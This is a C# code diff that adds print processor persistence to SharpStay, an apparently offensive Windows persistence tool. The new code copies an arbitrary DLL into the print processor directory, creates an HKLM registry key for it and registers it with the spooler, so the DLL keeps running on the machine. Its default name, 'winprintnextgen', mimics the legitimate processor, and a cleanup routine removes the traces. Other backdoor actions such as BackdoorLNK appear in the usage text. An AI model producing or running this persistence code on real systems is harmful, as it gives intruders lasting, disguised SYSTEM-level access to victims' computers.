@@ -11,6 +11,7 @@ using System.ServiceProcess;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
+using System.Text;
 
 namespace SharpStay
 {
@@ -37,6 +38,8 @@ namespace SharpStay
             Console.WriteLine("\tSharpstay.exe action=NewLNK");
             Console.WriteLine("\tSharpstay.exe action=BackdoorLNK");
             Console.WriteLine("\tSharpstay.exe action=ListTaskNames");
+            Console.WriteLine("\tSharpstay.exe action=PrintProcessor");
+            Console.WriteLine("\tSharpstay.exe action=ListPrintProcessors");
         }
 
         // Registry Items
@@ -985,6 +988,125 @@ namespace SharpStay
             }
         }
 
+        static void ListPrintProcessors()
+        {
+            uint cbNeeded = 0;
+            uint cReturned = 0;
+            if (EnumPrintProcessors("", "", 1, IntPtr.Zero, 0, ref cbNeeded, ref cReturned))
+            {
+                Console.WriteLine("[+] No PrintProcessors registered");
+            }
+            else
+            {
+                int lastWin32Error = Marshal.GetLastWin32Error();
+                if (lastWin32Error == ERROR_INSUFFICIENT_BUFFER)
+                {
+                    IntPtr pAddr = Marshal.AllocHGlobal((int)cbNeeded);
+                    if (EnumPrintProcessors("", "", 1, pAddr, cbNeeded, ref cbNeeded, ref cReturned))
+                    {
+                        Console.WriteLine("[+] Found PrintProcessors registered");
+                        PRINTPROCESSOR_INFO_1 printprocessorInfo1;
+                        int offset = pAddr.ToInt32();
+                        Type type = typeof(PRINTPROCESSOR_INFO_1);
+                        int increment = Marshal.SizeOf(type);
+                        for (int i = 0; i < cReturned; i++)
+                        {
+                            printprocessorInfo1 = (PRINTPROCESSOR_INFO_1)Marshal.PtrToStructure(new IntPtr(offset), type);
+                            Console.WriteLine("  [+] PrintProcessor: {0}", printprocessorInfo1.pName);
+                            offset += increment;
+                        }
+                        Marshal.FreeHGlobal(pAddr);
+                    }
+                    lastWin32Error = Marshal.GetLastWin32Error();
+                }
+            }
+        }
+
+        static void PrintProcessorPersistence(string printprocessorname, string dllpath, bool cleanup = false)
+        {
+            int length = 0;
+            GetPrintProcessorDirectory(null, null, 1, null, 0, ref length);
+            StringBuilder str = new StringBuilder(length);
+            GetPrintProcessorDirectory(null, null, 1, str, 1024, ref length);
+            string pdir = str.ToString();
+            Console.WriteLine("[+] Print Processor Directory is: {0}", pdir);
+            string dllfilename = Path.GetFileName(dllpath);
+            string keypath = String.Format("System\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\{0}", printprocessorname);
+            if (cleanup == true)
+            {
+                try
+                {
+                    using (var key = Registry.LocalMachine.OpenSubKey(keypath, false))
+                    {
+                        dllfilename = (string)key.GetValue("Driver");
+                    }
+                    Console.WriteLine("[+] Enumerated DLL filename: {0}", dllfilename);
+                    dllpath = pdir + "\\" + dllfilename;
+                    Registry.LocalMachine.DeleteSubKeyTree(keypath, false);
+                    Console.WriteLine("[+] Cleaned up HKLM:{0} subkeytree", keypath);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[-] Error: {0}", ex.Message);
+                }
+
+                try
+                {
+                    DeletePrintProcessor(null, null, printprocessorname);
+                    Console.WriteLine("[+] PrintProcessor {0} has been unregistered", printprocessorname);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[-] Exception in setting DeletePrintProcessor: {0}", ex.Message);
+                }
+
+                try
+                {
+                    System.IO.File.Delete(dllpath);
+                    Console.WriteLine("[+] DLL file {0} deleted from PrintProcessor folder {1}", dllfilename, pdir);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[-] Exception in File.Delete: {0}", ex.Message);
+                }
+            }
+            else
+            {
+                try
+                {
+                    RegistryKey regkey;
+                    regkey = Registry.LocalMachine.CreateSubKey(keypath);
+                    regkey.SetValue("Driver", Path.GetFileName(dllfilename));
+                    regkey.Close();
+                    Console.WriteLine("[+] Created PrintProcessor Registry HKLM:{0} key and value 'Driver' set to {1}", keypath, dllfilename);
+
+                    try
+                    {
+                        System.IO.File.Copy(dllpath, pdir + "\\" + dllfilename, true);
+                        Console.WriteLine("[+] DLL file {0} copied to PrintProcessor folder {1}", dllpath, pdir);
+                        try
+                        {
+                            bool res = AddPrintProcessor(null, null, dllfilename, printprocessorname);
+                            Console.WriteLine("[+] PrintProcessor {0} has been registered with DLL {1} (retval: {2})", printprocessorname, dllfilename, res);
+                            Console.WriteLine("[*] PrintProcessor Persistence should be working now (no worries about the false retval)");
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("[-] Exception in AddPrintProcessor: {0}", ex.Message);
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("[-] Exception in File.Copy: {0}", ex.Message);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[-] Error: {0}", ex.Message);
+                }
+            }
+        }
+
         static List<string> DirSearch(string dir)
         {
             List<string> files = new List<string>();
@@ -1527,6 +1649,39 @@ namespace SharpStay
             {
                 ListTaskNames();
             }
+            else if (arguments["action"].ToLower() == "listprintprocessors")
+            {
+                ListPrintProcessors();
+            }
+            else if (arguments["action"].ToLower() == "printprocessor")
+            {
+                bool cleanup = false;
+                string printprocessorname = "winprintnextgen";
+                string dllpath = "";
+                if (arguments.ContainsKey("printprocessorname"))
+                {
+                    printprocessorname = arguments["printprocessorname"];
+                }
+                if (arguments.ContainsKey("cleanup"))
+                {
+                    cleanup = true;
+                }
+                else
+                {
+                    if (!arguments.ContainsKey("dllpath"))
+                    {
+                        HowTo();
+                        return;
+                    }
+                    else
+                    {
+                        dllpath = arguments["dllpath"];
+                    }
+                }
+
+                PrintProcessorPersistence(printprocessorname, dllpath, cleanup);
+            }
+
             else
             {
                 HowTo();
@@ -1616,5 +1771,46 @@ namespace SharpStay
                 (STANDARD_RIGHTS_REQUIRED | SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_QUERY_STATUS | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_START | SERVICE_STOP | SERVICE_PAUSE_CONTINUE
                  | SERVICE_INTERROGATE | SERVICE_USER_DEFINED_CONTROL)
         }
+
+        [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern bool EnumPrintProcessors(
+            string pName,
+            string pEnvironment,
+            UInt32 Level,
+            IntPtr pPrintProcessorInfo,
+            UInt32 cbBuf,
+            ref UInt32 cbNeeded,
+            ref UInt32 cReturned);
+
+        private const int ERROR_INSUFFICIENT_BUFFER = 0x007A;
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        public struct PRINTPROCESSOR_INFO_1
+        {
+            [MarshalAs(UnmanagedType.LPTStr)]
+            public string pName;
+        }
+
+        [DllImport("winspool.drv")]
+        static extern bool GetPrintProcessorDirectory(
+            StringBuilder pName,
+            StringBuilder pEnv,
+            int Level,
+            [Out] StringBuilder outPath,
+            int bufferSize,
+            ref int Length);
+
+        [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern bool AddPrintProcessor(
+            string pName,
+            string pEnvironment,
+            string pPathName,
+            string pPrintProcessorName);
+
+        [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern bool DeletePrintProcessor(
+        string pName,
+        string pEnvironment,
+        string pPrintProcessorName);
     }
 }
